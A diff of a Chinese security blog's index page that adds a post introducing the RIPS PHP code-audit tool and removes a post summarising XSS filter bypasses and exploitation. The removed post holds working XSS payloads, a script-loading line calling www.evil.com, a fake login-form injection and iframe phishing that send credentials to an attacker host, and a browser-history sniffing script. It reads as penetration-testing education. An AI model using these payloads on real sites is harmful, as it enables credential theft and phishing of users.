@@ -258,6 +258,210 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/11/PHP代码审计工具RIPS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/11/PHP代码审计工具RIPS/" itemprop="url">
+                  PHP代码审计工具RIPS
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-11T12:31:13+08:00">
+                2018-05-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/11/PHP代码审计工具RIPS/" class="leancloud_visitors" data-flag-title="PHP代码审计工具RIPS">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-代码审计工具RIPS"><a href="#0x00-代码审计工具RIPS" class="headerlink" title="0x00 代码审计工具RIPS"></a>0x00 代码审计工具RIPS</h2><p>在安全工作中，代码审计是很重要的一项技能。在面对大规模的代码时，<br>使用自动化工具辅助人工漏洞挖掘，可以显著提高审计工作的效率。学会利用自动化代码审计工具，是每一个代码审计人员必备的能力。</p>
+<p>博主在代码审计过程中选择使用RIPS，它使用了静态分析技术，能够自动化地挖掘PHP源代码潜在的安全漏洞如XSS ，sql注入，敏感信息泄漏，文件包含等常见漏洞；也可以采用正则方式扫描代码发现漏洞；还能够采用自定义的语法扫描代码发现问题。渗透测试人员可以直接容易的审阅分析结果，而不用审阅整个程序代码。当然，最后去校验结果必须是我们自己去做的。</p>
+<h2 id="0x01-安装与配置"><a href="#0x01-安装与配置" class="headerlink" title="0x01 安装与配置"></a>0x01 安装与配置</h2><p>rips官网：<a href="http://rips-scanner.sourceforge.net/" target="_blank" rel="noopener">http://rips-scanner.sourceforge.net/</a><br>我们下载最新版本的rips之后，将压缩包解压后放在本地网站根目录下，通过浏览器（最好是firefox，因为rips宣称只支持firefox）访问即可使用。</p>
+<h2 id="0x02-主界面介绍"><a href="#0x02-主界面介绍" class="headerlink" title="0x02 主界面介绍"></a>0x02 主界面介绍</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips01.png" alt=""></p>
+<ul>
+<li>subdirs：如果勾选上这个选项，会扫描所有子目录，否则只扫描一级目录，缺省为勾选。</li>
+<li>verbosity level：选择扫描结果的详细程度，缺省为1(建议就使用1)。</li>
+<li>vuln type：选择需要扫描的漏洞类型。支持命令注入、代码执行、SQL注入等十余种漏洞类型，缺省为全部扫描。</li>
+<li>code style：选择扫描结果的显示风格（支持9种语法高亮）。</li>
+<li>/regex/：使用正则表达式过滤结果。</li>
+<li>path/file： 要扫描的目录。</li>
+<li>scan： 开始扫描。</li>
+</ul>
+<p>主界面就这些功能按键，我们接下来尝试一下。</p>
+<h2 id="0x03-实践"><a href="#0x03-实践" class="headerlink" title="0x03 实践"></a>0x03 实践</h2><p>在路径处输入我搭建的各种渗透测试环境的网页根目录，然后点击scan，稍等一会就会出现全部结果，并以图表的方式弹出一个总结的结果页面。</p>
+<p>我们可以发现，198个文件就报告了163个疑似漏洞的代码。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips02.png" alt=""></p>
+<p>然后我们看这些报告</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips03.png" alt=""></p>
+<p>点击每一个代码块左上角的书页小图标，就会展开这个代码的详情。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips04.png" alt=""></p>
+<p>点击每一个代码块左上角的红色小图标，可以生成漏洞的利用代码。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips05.png" alt=""></p>
+<p>将生成的php代码放在php文件里面传入参数就可以运行</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips06.png" alt=""></p>
+<p>点击每一个代码块左上角的问号小图标，就会展开这个漏洞的详情、原理。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips07.png" alt=""></p>
+<p>同样，问号中还有漏洞的解决方案和更安全的范例代码书写方法。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips08.png" alt=""></p>
+<p>总是将期望的字符串嵌入到引号中，并在将其嵌入查询之前使用PHP构建函数将字符串转义。 </p>
+<p>始终嵌入不带引号的预期整数，并在将数据嵌入查询之前将数据转换为整数。 </p>
+<p>转义数据但嵌入不带引号并不安全。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>方便使用的工具十分重要，但同时工具也只是帮我们更快速的筛选一遍有可能出现问题的地方，然后我们需要做的就是自己去审计，将真正有隐患的地方寻找出来并提出解决方案。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/08/内网渗透常用命令总结（linux）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2214,239 +2418,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/24/XSS绕过和利用方式总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/04/24/XSS绕过和利用方式总结/" itemprop="url">
-                  XSS绕过和利用方式总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-24T22:02:17+08:00">
-                2018-04-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/04/24/XSS绕过和利用方式总结/" class="leancloud_visitors" data-flag-title="XSS绕过和利用方式总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。</p>
-<h2 id="0x01-绕过"><a href="#0x01-绕过" class="headerlink" title="0x01 绕过"></a>0x01 绕过</h2><p>实际的情况中，很多网站会对&lt;&gt;，script等关键词进行限制，也有的不允许在input中运行js脚本，这个时候，就需要去考虑怎么绕过。</p>
-<ul>
-<li>1 大小写混用</li>
-</ul>
-<p>首先是最简单的大小写混用，对一些仅仅匹配过滤的系统进行绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;AleRt(&apos;xss&apos;)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>2 利用HTML标签属性值执行</li>
-</ul>
-<p>在某些系统中，用户不能自己构造html标签，这个时候可以使用html标签属性值调用js，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;jacascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>3 回车空格等</li>
-</ul>
-<p>在有些系统中，xss Filter仅仅将敏感字符列入黑名单，可以通过空格，tab，回车来绕过限制，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>或者换行输入用分号分隔：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>4 对标签属性进行转码</li>
-</ul>
-<p>普通的标签属性值过滤还可以通过编码绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>可以写成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&gt;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>5 自己构造事件</li>
-</ul>
-<p>不能依靠属性值运行xss的时候，我们可以尝试通过html事件来实现xss，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;#&quot; onerror=alert(&apos;xss&apos;) &gt;</span><br></pre></td></tr></table></figure></p>
-<p>图片地址不存在，加载失败的时候就会运行后面的脚本</p>
-<p>也可以在别的位置使用：<br>onload加载完成时运行<br>oncheck点击时运行<br>onmousemove当鼠标移动时运行</p>
-<ul>
-<li>6 注释过滤</li>
-</ul>
-<p>在样式表中，/**/中间的内容会被浏览器忽略，在css中，我们可以使用expression执行js代码，这个时候遇到黑名单过滤，我们就可以通过添加无意义的注释符号来避开过滤。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;xss:expr/*xss*/ession(alert(&apos;xss&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>7 拆分跨站</li>
-</ul>
-<p>有的网站输入框对输入长度有所限制，无法构造出完整的xss代码，这个时候有一种十分巧妙的拆分法可供选择，如我们要输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&apos;&lt;script src=http://www.evil.com/hack.js&gt;&lt;/script&gt;&apos;)</span><br></pre></td></tr></table></figure></p>
-<p>但是输入框限制每次只能输入30个字符时，我们可以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;src=htt&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;p://www&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.evil.c&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;om/hack&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.js&gt;&lt;/s&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;cript&gt;&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;eval(z)&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这样就成功将代码拼接在z中，再通过eval(z)执行代码。</p>
-<h2 id="0x03-cookie劫持"><a href="#0x03-cookie劫持" class="headerlink" title="0x03 cookie劫持"></a>0x03 cookie劫持</h2><p>cookie劫持在上一篇的跨站脚本攻击中已经详细演示过，具体方法就是通过用户点击链接访问页面，执行恶意xss代码然后将用户的浏览器cookie发送到我们自己的远程服务器，然后通过cookie来登陆。</p>
-<h2 id="0x04-xss钓鱼"><a href="#0x04-xss钓鱼" class="headerlink" title="0x04 xss钓鱼"></a>0x04 xss钓鱼</h2><p>xss钓鱼是xss最常用的利用方式，有很多种实现方式：</p>
-<ul>
-<li>xss重定向钓鱼</li>
-</ul>
-<p>我们在一个网页找到了xss漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=[Expliot]</span><br></pre></td></tr></table></figure></p>
-<p>构造如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=&lt;script&gt;document.location.href=&quot;http://www.hack.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>就可以通过xss重定向，将网页跳转到<a href="http://www.hack.com" target="_blank" rel="noopener">www.hack.com</a></p>
-<ul>
-<li>HTML注入式钓鱼</li>
-</ul>
-<p>仍然假设有如下漏洞页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=[Expliot]</span><br></pre></td></tr></table></figure></p>
-<p>然后我们在input里面写入一段html代码，就会在正常的网页中增添一个我们构造的登陆表单：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.hack.com/index.php?input=&quot;&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form</span><br><span class="line">Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt;</span><br><span class="line">&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>然后通过这个表单覆盖网页中的部分位置，就很容易引诱用户输入账号密码。</p>
-<ul>
-<li>iframe钓鱼</li>
-</ul>
-<p>iframe是HTML标签，作用是文档中的文档，或者浮动的框架(FRAME)。iframe元素会创建包含另外一个文档的内联框架。<br>我们先来看一个iframe的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;body&#123;</span><br><span class="line">      margin:0px;</span><br><span class="line">	  border:0px;</span><br><span class="line">	  padding:0px;</span><br><span class="line">  &#125;</span><br><span class="line">iframe&#123;border:0px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;iframe src=&quot;http://www.baidu.com/&quot; id=&quot;iframepage&quot; name=&quot;iframepage&quot;  width=&quot;100%&quot; height=&quot;100%&quot; &gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这样我们可以用百度页面覆盖整个网页。</p>
-<p>而xss-iframe钓鱼就是攻击者在有xss的网站中用iframe框架调用自己的黑页，覆盖整个页面或者登陆框，将数据传给自己。<br>我们可以先在自己的<a href="http://www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中" target="_blank" rel="noopener">www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;body&#123;margin:0px;border:0px;padding:0px;&#125;</span><br><span class="line">iframe&#123;border:0px;&#125;</span><br><span class="line">&lt;iframe src=&quot;http://www.hack.com/&quot;width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
-<p>就会覆盖整个网页，并且将数据传给我们的网站。而且用户访问这个网站时url仍然是原本的url。</p>
-<h2 id="0x05-http-history-hack"><a href="#0x05-http-history-hack" class="headerlink" title="0x05 http history hack"></a>0x05 http history hack</h2><p>css中有个属性visited，可以设置访问过的链接样式，然后xss可以通过遍历检查css中的visited属性，来查看一个用户是否访问过某些网站。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt; script &gt;</span><br><span class="line">var websites = [要检测的访问过的网址列表（自己补充）];</span><br><span class="line">//遍历每个URL</span><br><span class="line">for (var i = 0; i &lt; websites.length: i++) &#123;</span><br><span class="line">    var link = document.createElement(&quot;a&quot;);</span><br><span class="line">    link.id = &quot;id&quot; + i;</span><br><span class="line">    link.href = websites[i];</span><br><span class="line">    link.innerHTML = websites[i];</span><br><span class="line">    document.write(&apos;&lt;style&gt;&apos;);</span><br><span class="line">    document.write(&apos;#id&apos; + i + &quot;:visited &#123;color:#FF0000;&#125;&quot;);</span><br><span class="line">    document.write(&apos;&lt;/style&gt;&apos;);</span><br><span class="line">    document.body.appendChild(link);</span><br><span class="line">    var color = document.defaultView.getComputedStyle(link, null).getPropertyValue(&quot;color&quot;);</span><br><span class="line">    document.body.removeChild(link);</span><br><span class="line">    if (color == &quot;rgb(255,0,0)&quot;) &#123; //visited</span><br><span class="line">        var item = document.createElement(&apos;li&apos;);</span><br><span class="line">        item.appendChild(link);</span><br><span class="line">        document.getElementById(&apos;visited&apos;).appendChild(item);</span><br><span class="line">    &#125; else &#123; //Not visited</span><br><span class="line">        var item = document.createElement(&apos;li&apos;);</span><br><span class="line">        item.appendChild(link);</span><br><span class="line">        document.getElementById(&apos;notvisited&apos;).appendChild(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &lt; /script&gt;/</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x06-xss网页挂马"><a href="#0x06-xss网页挂马" class="headerlink" title="0x06 xss网页挂马"></a>0x06 xss网页挂马</h2><p>在存储型xss中，我们可以将自己的xss代码提交上去，然后链接我们的木马，这样每个访问有xss页面的人都会触发木马。</p>
-<h2 id="0x07-xss-Wrom"><a href="#0x07-xss-Wrom" class="headerlink" title="0x07 xss Wrom"></a>0x07 xss Wrom</h2><p>xss wrom即xss蠕虫，在一些存在存储型xss漏洞的大型社交网站，如果我们将xss代码的功能写成让访问到的人，在自己的主页里或其他有权限的页面提交一个一样的xss代码，这样浏览他的主页的人也会受到xss wrom影响继续写xss代码，这样就会很快传遍整个网络，危害极大。<br>而且xss蠕虫通常使用了大量的Ajax技术，即异步请求，无须刷新即可传输数据，隐蔽性高，传播速度极快。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2496,7 +2467,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">98</span>
+                <span class="site-state-item-count">99</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
